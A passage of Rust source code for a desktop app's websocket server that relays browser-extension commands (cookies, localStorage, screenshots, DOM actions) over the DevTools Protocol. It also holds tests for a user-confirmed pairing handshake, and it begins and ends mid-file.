                // JSON-encoding produces a quoted string with all special chars
                // properly escaped (backslash, quotes, newlines, etc.).
                let safe_selector = serde_json::to_string(&selector)
                    .map_err(|e| format!("Failed to encode selector: {}", e))?;
                let safe_attribute = serde_json::to_string(&attribute)
                    .map_err(|e| format!("Failed to encode attribute: {}", e))?;
                let safe_value = serde_json::to_string(&value)
                    .map_err(|e| format!("Failed to encode value: {}", e))?;

                let script = format!(
                    r#"(function() {{
                        const el = document.querySelector({});
                        if (!el) throw new Error('Element not found');
                        el.setAttribute({}, {});
                        return true;
                    }})()"#,
                    safe_selector, safe_attribute, safe_value
                );
                client.evaluate(&script).await.map_err(|e| e.to_string())?;

                Ok(json!({
                    "set": true,
                    "tab_id": resolved_tab_id,
                    "selector": selector,
                    "attribute": attribute
                }))
            }

            NativeMessage::Screenshot { tab_id, format } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                let image_bytes = client
                    .capture_screenshot(false)
                    .await
                    .map_err(|e| e.to_string())?;
                let requested_format = format.unwrap_or_else(|| "png".to_string());

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "format": requested_format,
                    "data": BASE64_STANDARD.encode(image_bytes)
                }))
            }

            NativeMessage::GetAccessibilityTree { tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                let tree = client
                    .evaluate(AccessibilityAnalyzer::get_accessibility_tree_script())
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "tree": tree
                }))
            }

            NativeMessage::GetFocusableElements { tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                let elements = client
                    .evaluate(
                        r#"(function() {
                            const nodes = document.querySelectorAll(
                                'a[href], button, input, textarea, select, [tabindex]:not([tabindex="-1"])'
                            );
                            return Array.from(nodes).map((el) => ({
                                tag: el.tagName.toLowerCase(),
                                id: el.id || null,
                                class_name: el.className || null,
                                text: (el.textContent || '').trim().slice(0, 200)
                            }));
                        })()"#,
                    )
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "elements": elements
                }))
            }

            NativeMessage::GetCookies { url } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, None, false, None).await?;
                let mut cookies = AdvancedBrowserOps::get_cookies(client)
                    .await
                    .map_err(|e| e.to_string())?;

                if let Some(target_url) = url {
                    let domain = target_url
                        .replace("https://", "")
                        .replace("http://", "")
                        .split('/')
                        .next()
                        .unwrap_or("")
                        .to_string();
                    cookies.retain(|cookie| cookie.domain.contains(&domain));
                }

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "cookies": cookies
                }))
            }

            NativeMessage::SetCookie { cookie } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, None, false, None).await?;
                let mapped_cookie = Cookie {
                    name: cookie.name,
                    value: cookie.value,
                    domain: cookie.domain.unwrap_or_default(),
                    path: cookie.path.unwrap_or_else(|| "/".to_string()),
                    secure: cookie.secure.unwrap_or(false),
                    http_only: cookie.http_only.unwrap_or(false),
                    same_site: None,
                };
                AdvancedBrowserOps::set_cookie(client, mapped_cookie)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "set": true,
                    "tab_id": resolved_tab_id
                }))
            }

            NativeMessage::GetLocalStorage { key, tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
                let data = if let Some(storage_key) = key {
                    let key_js = serde_json::to_string(&storage_key).map_err(|e| e.to_string())?;
                    let script = format!("window.localStorage.getItem({})", key_js);
                    client.evaluate(&script).await.map_err(|e| e.to_string())?
                } else {
                    client
                        .evaluate(
                            r#"(function() {
                                const output = {};
                                for (let i = 0; i < localStorage.length; i++) {
                                    const key = localStorage.key(i);
                                    if (key !== null) {
                                        output[key] = localStorage.getItem(key);
                                    }
                                }
                                return output;
                            })()"#,
                        )
                        .await
                        .map_err(|e| e.to_string())?
                };

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "data": data
                }))
            }

            NativeMessage::SetLocalStorage { key, value, tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
                let key_js = serde_json::to_string(&key).map_err(|e| e.to_string())?;
                let value_js = serde_json::to_string(&value).map_err(|e| e.to_string())?;
                let script = format!(
                    "window.localStorage.setItem({}, {}); true;",
                    key_js, value_js
                );
                client.evaluate(&script).await.map_err(|e| e.to_string())?;

                Ok(json!({
                    "set": true,
                    "tab_id": resolved_tab_id,
                    "key": key
                }))
            }

            NativeMessage::GetPageInfo { tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                let url = client.get_url().await.map_err(|e| e.to_string())?;
                let title = client.get_title().await.map_err(|e| e.to_string())?;

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "url": url,
                    "title": title
                }))
            }

            NativeMessage::GetPageContent { tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                let html = client.get_content().await.map_err(|e| e.to_string())?;

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "html": html
                }))
            }

            NativeMessage::PageContext {
                url,
                title,
                html,
                selected_text,
                tab_id,
                timestamp,
            } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let tab_id_u32 = u32::try_from(tab_id)
                    .map_err(|_| format!("Invalid negative tab_id for page_context: {}", tab_id))?;

                let context = crate::sys::commands::extension::PageContext {
                    url,
                    title,
                    html,
                    selected_text,
                    tab_id: tab_id_u32,
                    timestamp,
                };
                let response =
                    crate::sys::commands::extension::process_page_context_event(context, app)
                        .await?;
                serde_json::to_value(response)
                    .map_err(|e| format!("Failed to serialize page_context response: {}", e))
            }

            NativeMessage::TaskResult {
                task_id,
                success,
                screenshot,
                result,
                error,
                actions_performed,
                duration,
            } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let task_result = crate::sys::commands::extension::TaskResult {
                    task_id,
                    success,
                    screenshot,
                    result,
                    error,
                    actions_performed,
                    duration,
                };
                let response =
                    crate::sys::commands::extension::process_task_result_event(task_result, app)
                        .await?;
                serde_json::to_value(response)
                    .map_err(|e| format!("Failed to serialize task_result response: {}", e))
            }

            NativeMessage::SelectedTextQuery(payload) => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let now_ms = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|duration| duration.as_millis() as u64)
                    .unwrap_or(0);
                let staged = stage_selected_context_handoff(payload, now_ms)
                    .map_err(|error| error.to_string())?;

                // Notify the Desktop UI. This does not mutate LATEST_PAGE_CONTEXT or any
                // conversation; insertion remains an explicit frontend/user action.
                let _ = app.emit(
                    "extension:selected_text_query",
                    &json!({
                        "text": staged.selected_text,
                        "context_url": staged.context_url,
                        "tab_id": staged.tab_id,
                        "selected_at": staged.selected_at,
                    }),
                );

                Ok(json!({
                    "success": true,
                    "staged": true,
                    "destination": "desktop_context_preview"
                }))
            }

            NativeMessage::ExecuteScript { script, tab_id } => {
                ensure_peer_script_allowed(&script)?;
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
                let result = client.evaluate(&script).await.map_err(|e| e.to_string())?;

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "result": result
                }))
            }

            NativeMessage::Hover { selector, tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
                client
                    .hover_element(&selector)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "hovered": true,
                    "tab_id": resolved_tab_id,
                    "selector": selector
                }))
            }

            NativeMessage::WaitForSelector {
                selector,
                timeout_ms,
                tab_id,
            } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
                let timeout = timeout_ms.unwrap_or(30_000);
                client
                    .wait_for_selector(&selector, timeout)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "found": true,
                    "tab_id": resolved_tab_id,
                    "selector": selector
                }))
            }

            NativeMessage::SelectOption {
                selector,
                value,
                tab_id,
            } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
                client
                    .select_option(&selector, &value)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "selected": true,
                    "tab_id": resolved_tab_id,
                    "selector": selector,
                    "value": value
                }))
            }

            NativeMessage::SetChecked {
                selector,
                checked,
                tab_id,
            } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
                client
                    .set_checked(&selector, checked)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "checked": checked,
                    "tab_id": resolved_tab_id,
                    "selector": selector
                }))
            }

            NativeMessage::Focus { selector, tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
                client
                    .focus_element(&selector)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "focused": true,
                    "tab_id": resolved_tab_id,
                    "selector": selector
                }))
            }

            NativeMessage::ScrollIntoView { selector, tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
                client
                    .scroll_into_view(&selector)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "scrolled": true,
                    "tab_id": resolved_tab_id,
                    "selector": selector
                }))
            }

            NativeMessage::Response { .. } | NativeMessage::Pong => {
                Err("Unexpected native message type from extension".to_string())
            }
        }
    }

    async fn get_native_cdp_client(
        app_handle: &tauri::AppHandle,
        requested_tab_id: Option<i32>,
        allow_create: bool,
        initial_url: Option<&str>,
    ) -> Result<(Arc<CdpClient>, String), String> {
        let browser_state = app_handle.state::<BrowserStateWrapper>();
        let resolved_tab_id = if let Some(tab_id) = requested_tab_id {
            tab_id.to_string()
        } else {
            let tab_manager = browser_state
                .get_tab_manager()
                .map_err(|e| format!("Browser state unavailable: {}", e))?;
            let tab_manager = tab_manager.lock().await;
            let tabs = tab_manager.list_tabs().await.map_err(|e| e.to_string())?;

            if let Some(tab) = tabs.first() {
                tab.id.clone()
            } else if allow_create {
                let url = initial_url.unwrap_or("about:blank");
                tab_manager.open_tab(url).await.map_err(|e| e.to_string())?
            } else {
                return Err(
                    "No browser tabs available. Open a tab or provide a valid tab_id first."
                        .to_string(),
                );
            }
        };

        let cdp = browser_state
            .get_cdp_client_for_tab(&resolved_tab_id)
            .await
            .map_err(|e| {
                format!(
                    "Failed to connect to browser tab {}: {}",
                    resolved_tab_id, e
                )
            })?;

        Ok((cdp, resolved_tab_id))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};

    #[test]
    fn selected_context_receiver_stages_without_touching_auto_injected_chat_context() {
        let source = include_str!("websocket_server.rs");
        let branch = source
            .split("NativeMessage::SelectedTextQuery")
            .nth(1)
            .and_then(|tail| tail.split("NativeMessage::ExecuteScript").next())
            .expect("selected-context receiver branch must exist");

        assert!(!branch.contains("extension::LATEST_PAGE_CONTEXT"));
        assert!(branch.contains("stage_selected_context_handoff"));
    }

    #[test]
    fn vscode_health_frames_use_the_realtime_event_contract() {
        let auth: RealtimeEvent = serde_json::from_value(json!({
            "type": "Authenticate",
            "user_id": "vscode-extension",
            "team_id": null,
            "token": "desktop-token"
        }))
        .expect("VS Code auth must deserialize through RealtimeEvent");
        match auth {
            RealtimeEvent::Authenticate {
                user_id,
                team_id,
                token,
            } => {
                assert_eq!(user_id, "vscode-extension");
                assert_eq!(team_id, None);
                assert_eq!(token.as_deref(), Some("desktop-token"));
            }
            other => panic!("unexpected auth variant: {other:?}"),
        }

        let ping: RealtimeEvent = serde_json::from_value(json!({
            "type": "NativeMessage",
            "id": "vscode-ping-1",
            "payload": { "type": "ping" }
        }))
        .expect("VS Code ping must deserialize through RealtimeEvent");
        match ping {
            RealtimeEvent::NativeMessage { id, payload } => {
                assert_eq!(id, "vscode-ping-1");
                assert_eq!(payload, json!({ "type": "ping" }));
            }
            other => panic!("unexpected ping variant: {other:?}"),
        }
    }

    #[tokio::test]
    async fn authenticated_user_status_requires_the_exact_live_user() {
        let database = Arc::new(TokioMutex::new(
            rusqlite::Connection::open_in_memory().expect("in-memory presence database"),
        ));
        let presence = Arc::new(PresenceManager::new(database));
        let server = RealtimeServer::new(
            presence,
            Arc::new(TokioRwLock::new("desktop-token".to_string())),
            None,
        );

        assert!(!server.has_authenticated_user("vscode-extension").await);
        server.clients.lock().await.insert(
            "client-1".to_string(),
            WebSocketClient {
                id: "client-1".to_string(),
                user_id: Some("vscode-extension".to_string()),
                team_id: None,
                current_resource: None,
                capabilities: ExtensionCapabilities::none(),
            },
        );

        assert!(server.has_authenticated_user("vscode-extension").await);
        assert!(!server.has_authenticated_user("chrome-extension").await);
    }

    // ── E2: /pair endpoint tests ──────────────────────────────────────────────

    /// helper: send a raw HTTP request string to a bound TcpListener and collect
    /// the full response bytes.
    async fn send_http(listener_addr: SocketAddr, request: &str) -> Vec<u8> {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let mut client = tokio::net::TcpStream::connect(listener_addr).await.unwrap();
        client.write_all(request.as_bytes()).await.unwrap();
        client.shutdown().await.ok();
        let mut response = Vec::new();
        client.read_to_end(&mut response).await.unwrap();
        response
    }

    /// Spawn handle_http_pair on a fresh loopback listener; return (addr, pair_token_arc).
    async fn spawn_pair_handler() -> (SocketAddr, Arc<TokioRwLock<String>>) {
        let pair_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));
        let bridge_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));
        let (addr, _installs) = spawn_pair_handler_with(pair_token.clone(), bridge_token).await;
        (addr, pair_token)
    }

    fn new_pending_pair_requests() -> PendingPairRequests {
        Arc::new(TokioMutex::new(HashMap::new()))
    }

    fn pair_endpoint_state(
        pair_token: Arc<TokioRwLock<String>>,
        bridge_token: Arc<TokioRwLock<String>>,
        pending: PendingPairRequests,
    ) -> PairEndpointState {
        PairEndpointState {
            pair_token,
            bridge_token,
            pending,
            app_handle: None,
        }
    }

    /// Spawn one handler bound to caller-owned pending-request state so a test
    /// can read the code exactly where the Desktop UI reads it.
    async fn spawn_handshake_handler(
        pair_token: Arc<TokioRwLock<String>>,
        pending: PendingPairRequests,
    ) -> (SocketAddr, InstallLog) {
        let state = pair_endpoint_state(
            pair_token,
            Arc::new(TokioRwLock::new("desktop-bridge-secret".to_string())),
            pending,
        );
        spawn_pair_handler_state(state).await
    }

    async fn spawn_pair_handler_state(state: PairEndpointState) -> (SocketAddr, InstallLog) {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let installs: InstallLog = Arc::new(std::sync::Mutex::new(Vec::new()));
        let recorder = installs.clone();
        tokio::spawn(async move {
            let (stream, peer) = listener.accept().await.unwrap();
            RealtimeServer::handle_http_pair_with(stream, peer, state, move |extension_id| {
                recorder
                    .lock()
                    .unwrap()
                    .push(extension_id.unwrap_or_default().to_string());
                Ok(1)
            })
            .await;
        });
        (addr, installs)
    }

    async fn read_displayed_code(pending: &PendingPairRequests, request_id: &str) -> String {
        pending
            .lock()
            .await
            .get(request_id)
            .expect("desktop must hold the pending request")
            .code
            .clone()
    }

    fn json_body(response: &str) -> serde_json::Value {
        serde_json::from_str(&response[response.find("\r\n\r\n").unwrap() + 4..]).unwrap()
    }

    fn pair_request_http(extension_id: &str) -> String {
        let body = format!(r#"{{"extensionId":"{extension_id}"}}"#);
        format!(
            "POST /pair/request HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
            body.len(),
            body
        )
    }

    fn pair_confirm_http(request_id: &str, code: &str) -> String {
        let body = format!(r#"{{"requestId":"{request_id}","code":"{code}"}}"#);
        format!(
            "POST /pair/confirm HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
            body.len(),
            body
        )
    }

    /// Extension ids handed to the manifest installer by one /pair request.
    type InstallLog = Arc<std::sync::Mutex<Vec<String>>>;

    const TEST_EXTENSION_ID: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

    /// Spawn handle_http_pair against caller-supplied pair/bridge token state,
    /// recording every manifest install the handler authorizes instead of
    /// writing real native-messaging manifests.
    async fn spawn_pair_handler_with(
        pair_token: Arc<TokioRwLock<String>>,
        bridge_token: Arc<TokioRwLock<String>>,
    ) -> (SocketAddr, InstallLog) {
        spawn_pair_handler_state(pair_endpoint_state(
            pair_token,
            bridge_token,
            new_pending_pair_requests(),
        ))
        .await
    }

    #[tokio::test]
    async fn pair_returns_200_with_token_and_fingerprint() {
        let (addr, pair_token) = spawn_pair_handler().await;
        let resp_bytes = send_http(
            addr,
            "POST /pair HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
        )
        .await;
        let resp = String::from_utf8_lossy(&resp_bytes);
        assert!(
            resp.starts_with("HTTP/1.1 200"),
            "expected 200, got: {resp}"
        );
        let body_start = resp.find("\r\n\r\n").unwrap() + 4;
        let body: serde_json::Value = serde_json::from_str(&resp[body_start..]).unwrap();
        let token = body["token"].as_str().unwrap();
        let fingerprint = body["fingerprint"].as_str().unwrap();
        // token must be 64 hex chars (32 bytes)
        assert_eq!(token.len(), 64, "token should be 64 hex chars");
        assert!(token.chars().all(|c| c.is_ascii_hexdigit()));
        // fingerprint is first 8 chars of token (all ASCII hex)
        assert_eq!(fingerprint, &token[..8]); // utf8-safe: hex token
                                              // pair_token shared state updated
        assert_eq!(*pair_token.read().await, token);
    }

    #[tokio::test]
    async fn pair_token_has_correct_length() {
        let (addr, pair_token) = spawn_pair_handler().await;
        send_http(
            addr,
            "POST /pair HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
        )
        .await;
        let stored = pair_token.read().await.clone();
        // 32 bytes = 64 hex chars
        assert_eq!(stored.len(), 64);
    }

    #[tokio::test]
    async fn pair_fingerprint_is_first_8_chars_of_token() {
        let (addr, _pair_token) = spawn_pair_handler().await;
        let resp_bytes = send_http(
            addr,
            "POST /pair HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
        )
        .await;
        let resp = String::from_utf8_lossy(&resp_bytes);
        let body_start = resp.find("\r\n\r\n").unwrap() + 4;
        let body: serde_json::Value = serde_json::from_str(&resp[body_start..]).unwrap();
        let token = body["token"].as_str().unwrap();
        let fingerprint = body["fingerprint"].as_str().unwrap();
        assert_eq!(fingerprint.len(), 8);
        assert_eq!(fingerprint, &token[..8]); // utf8-safe: hex token
    }

    #[tokio::test]
    async fn pair_idempotent_second_call_rotates_token() {
        // First call
        let (addr1, pair_token1) = spawn_pair_handler().await;
        let resp1 = send_http(
            addr1,
            "POST /pair HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
        )
        .await;
        let r1 = String::from_utf8_lossy(&resp1);
        let b1: serde_json::Value =
            serde_json::from_str(&r1[r1.find("\r\n\r\n").unwrap() + 4..]).unwrap();
        let token1 = b1["token"].as_str().unwrap().to_string();

        // Second call on a new handler sharing the same pair_token arc
        let (addr2, _installs) = spawn_pair_handler_with(
            pair_token1.clone(),
            Arc::new(TokioRwLock::new(String::new())),
        )
        .await;
        let resp2 = send_http(
            addr2,
            "POST /pair HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
        )
        .await;
        let r2 = String::from_utf8_lossy(&resp2);
        let b2: serde_json::Value =
            serde_json::from_str(&r2[r2.find("\r\n\r\n").unwrap() + 4..]).unwrap();
        let token2 = b2["token"].as_str().unwrap().to_string();

        // Both calls succeed (200) but tokens differ (rotation)
        assert!(r1.starts_with("HTTP/1.1 200"));
        assert!(r2.starts_with("HTTP/1.1 200"));
        assert_ne!(token1, token2, "second /pair call must rotate token");
        assert_eq!(*pair_token1.read().await, token2);
    }

    #[tokio::test]
    async fn pair_wrong_path_returns_404() {
        let (addr, _pair_token) = spawn_pair_handler().await;
        let resp_bytes = send_http(
            addr,
            "POST /wrong HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
        )
        .await;
        let resp = String::from_utf8_lossy(&resp_bytes);
        assert!(
            resp.starts_with("HTTP/1.1 404"),
            "expected 404, got: {resp}"
        );
    }

    #[tokio::test]
    async fn pair_extension_manifest_install_requires_bridge_token() {
        let (addr, pair_token) = spawn_pair_handler().await;
        let body = r#"{"extensionId":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}"#;
        let request = format!(
            "POST /pair HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
            body.len(),
            body
        );

        let resp_bytes = send_http(addr, &request).await;
        let resp = String::from_utf8_lossy(&resp_bytes);
        assert!(
            resp.starts_with("HTTP/1.1 401"),
            "expected 401, got: {resp}"
        );
        assert!(
            pair_token.read().await.is_empty(),
            "unauthorized manifest install must not rotate pair token"
        );
    }

    fn manifest_install_request(extension_id: &str, bridge_token: Option<&str>) -> String {
        let body = format!(r#"{{"extensionId":"{extension_id}"}}"#);
        let authorization = bridge_token
            .map(|token| format!("X-Bridge-Token: {token}\r\n"))
            .unwrap_or_default();
        format!(
            "POST /pair HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\n{}Content-Length: {}\r\n\r\n{}",
            authorization,
            body.len(),
            body
        )
    }

    async fn mint_pair_token(pair_token: Arc<TokioRwLock<String>>, bridge_token: &str) -> String {
        let (addr, _installs) = spawn_pair_handler_with(
            pair_token,
            Arc::new(TokioRwLock::new(bridge_token.to_string())),
        )
        .await;
        let resp = send_http(
            addr,
            "POST /pair HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
        )
        .await;
        let resp = String::from_utf8_lossy(&resp);
        assert!(resp.starts_with("HTTP/1.1 200"), "bootstrap failed: {resp}");
        let body: serde_json::Value =
            serde_json::from_str(&resp[resp.find("\r\n\r\n").unwrap() + 4..]).unwrap();
        body["token"].as_str().unwrap().to_string()
    }

    #[tokio::test]
    async fn pair_minted_token_cannot_authorize_manifest_install() {
        let pair_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));
        let bridge_token: Arc<TokioRwLock<String>> =
            Arc::new(TokioRwLock::new("desktop-bridge-secret".to_string()));

        let minted = mint_pair_token(pair_token.clone(), "desktop-bridge-secret").await;
        assert_eq!(*pair_token.read().await, minted);

        let (addr, installs) =
            spawn_pair_handler_with(pair_token.clone(), bridge_token.clone()).await;
        let resp = send_http(
            addr,
            &manifest_install_request("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", Some(&minted)),
        )
        .await;
        let resp = String::from_utf8_lossy(&resp);

        assert!(
            resp.starts_with("HTTP/1.1 401"),
            "a token minted by /pair must not authorize a manifest install, got: {resp}"
        );
        assert!(
            installs.lock().unwrap().is_empty(),
            "rejected request must never reach install_manifests"
        );
        assert_eq!(
            *pair_token.read().await,
            minted,
            "rejected install must not rotate the pair token"
        );
    }

    #[tokio::test]
    async fn pair_manifest_install_accepts_the_desktop_bridge_secret() {
        let pair_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));
        let bridge_token: Arc<TokioRwLock<String>> =
            Arc::new(TokioRwLock::new("desktop-bridge-secret".to_string()));

        let (addr, installs) = spawn_pair_handler_with(pair_token, bridge_token).await;
        let resp = send_http(
            addr,
            &manifest_install_request(
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                Some("desktop-bridge-secret"),
            ),
        )
        .await;
        let resp = String::from_utf8_lossy(&resp);

        assert!(
            resp.starts_with("HTTP/1.1 200"),
            "expected 200, got: {resp}"
        );
        assert_eq!(
            *installs.lock().unwrap(),
            vec!["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string()]
        );
    }

    // ── SEC-11 handshake: Desktop-displayed, user-confirmed code ─────────────

    #[tokio::test]
    async fn pair_request_hands_back_only_an_opaque_request_id() {
        let pending = new_pending_pair_requests();
        let pair_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));
        let (addr, installs) = spawn_handshake_handler(pair_token.clone(), pending.clone()).await;

        let response = send_http(addr, &pair_request_http(TEST_EXTENSION_ID)).await;
        let response = String::from_utf8_lossy(&response);
        assert!(
            response.starts_with("HTTP/1.1 200"),
            "expected 200, got: {response}"
        );

        let body = json_body(&response);
        let request_id = body["requestId"].as_str().unwrap().to_string();
        let code = read_displayed_code(&pending, &request_id).await;

        assert!(
            body.get("code").is_none(),
            "response must not carry the code"
        );
        assert!(
            !response.contains(&code),
            "the confirmation code must never appear on the HTTP channel"
        );
        assert!(
            installs.lock().unwrap().is_empty(),
            "/pair/request must not install anything"
        );
        assert!(
            pair_token.read().await.is_empty(),
            "/pair/request must not mint a bridge token"
        );
    }

    #[tokio::test]
    async fn pair_confirm_with_the_code_the_desktop_displayed_installs_and_mints() {
        let pending = new_pending_pair_requests();
        let pair_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));

        let (addr, _) = spawn_handshake_handler(pair_token.clone(), pending.clone()).await;
        let requested = send_http(addr, &pair_request_http(TEST_EXTENSION_ID)).await;
        let request_id = json_body(&String::from_utf8_lossy(&requested))["requestId"]
            .as_str()
            .unwrap()
            .to_string();

        let code = read_displayed_code(&pending, &request_id).await;

        let (addr, installs) = spawn_handshake_handler(pair_token.clone(), pending.clone()).await;
        let response = send_http(addr, &pair_confirm_http(&request_id, &code)).await;
        let response = String::from_utf8_lossy(&response);
        assert!(
            response.starts_with("HTTP/1.1 200"),
            "expected 200, got: {response}"
        );

        let body = json_body(&response);
        let token = body["token"].as_str().unwrap();
        assert_eq!(token.len(), 64);
        assert_eq!(body["fingerprint"].as_str().unwrap(), &token[..8]); // utf8-safe: 64 hex chars
        assert_eq!(body["nativeHostManifestInstalled"], serde_json::json!(true));
        assert_eq!(
            *installs.lock().unwrap(),
            vec![TEST_EXTENSION_ID.to_string()]
        );
        assert_eq!(*pair_token.read().await, token);
    }

    /// The security property: the code travels Desktop → human → extension,
    /// never over HTTP. A caller that reaches the loopback port but cannot see
    /// the Desktop screen holds the request id and nothing else, so it cannot
    /// confirm — and its guesses are exhausted long before the code space is.
    #[tokio::test]
    async fn pair_confirm_refuses_a_caller_that_cannot_see_the_desktop_screen() {
        let pending = new_pending_pair_requests();
        let pair_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));

        let (addr, _) = spawn_handshake_handler(pair_token.clone(), pending.clone()).await;
        let requested = send_http(addr, &pair_request_http(TEST_EXTENSION_ID)).await;
        let requested = String::from_utf8_lossy(&requested).to_string();
        let request_id = json_body(&requested)["requestId"]
            .as_str()
            .unwrap()
            .to_string();

        let displayed_code = read_displayed_code(&pending, &request_id).await;

        let mut attempts: Vec<String> = json_body(&requested)
            .as_object()
            .unwrap()
            .values()
            .filter_map(|value| value.as_str())
            .map(normalize_pair_code)
            .filter(|candidate| candidate.len() == PAIR_CODE_LEN)
            .collect();
        attempts.push("AAAAAAAA".to_string());
        attempts.push("BBBBBBBB".to_string());
        attempts.push("CCCCCCCC".to_string());
        attempts.truncate(MAX_PAIR_CONFIRM_ATTEMPTS as usize);

        for attempt in &attempts {
            let (addr, installs) =
                spawn_handshake_handler(pair_token.clone(), pending.clone()).await;
            let response = send_http(addr, &pair_confirm_http(&request_id, attempt)).await;
            let response = String::from_utf8_lossy(&response);
            assert!(
                response.starts_with("HTTP/1.1 401"),
                "a caller with only the HTTP response must not confirm, got: {response}"
            );
            assert!(
                installs.lock().unwrap().is_empty(),
                "a rejected confirm must never reach install_manifests"
            );
        }

        assert!(
            !requested.contains(&displayed_code),
            "the code must not be recoverable from the /pair/request response"
        );

        let (addr, installs) = spawn_handshake_handler(pair_token.clone(), pending.clone()).await;
        let response = send_http(addr, &pair_confirm_http(&request_id, &displayed_code)).await;
        let response = String::from_utf8_lossy(&response);
        assert!(
            response.starts_with("HTTP/1.1 401"),
